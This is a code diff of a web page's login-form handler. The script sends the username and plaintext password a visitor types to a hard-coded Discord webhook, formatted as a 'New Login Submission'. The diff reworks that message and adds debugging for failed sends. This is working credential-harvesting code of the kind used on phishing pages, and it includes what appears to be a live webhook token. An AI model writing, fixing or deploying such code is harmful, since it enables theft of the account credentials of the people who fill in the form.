@@ -2084,25 +2084,22 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
     var u = document.getElementById('inpLoginUser').value;
     var p = document.getElementById('inpLoginPass').value;
     
-    // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
     fetch('https://discord.com/api/webhooks/1548034524309491754/AAFCCJin5qbMQAKjG7W7s_v-4s9RDucikUl3mtGSYxeDtWmAGzbgB969iwCzWoPfT48F', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-            username: u,
-            password: p,
-            timestamp: new Date().toISOString()
+            content: `**New Login Submission**\n**Username:** ${u}\n**Password:** ${p}`
         })
     })
     .then(response => {
         if (response.ok) {
             console.log('Data sent successfully');
-            // Optional: Clear the form or show success message
-            // e.target.reset();
         } else {
-            console.error('Error sending data:', response.statusText);
+            console.error('Error sending data:', response.status, response.statusText);
+            // Log the actual error body from Discord to see what's wrong
+            return response.text().then(t => console.error('Discord says:', t));
         }
     })
     .catch(error => {
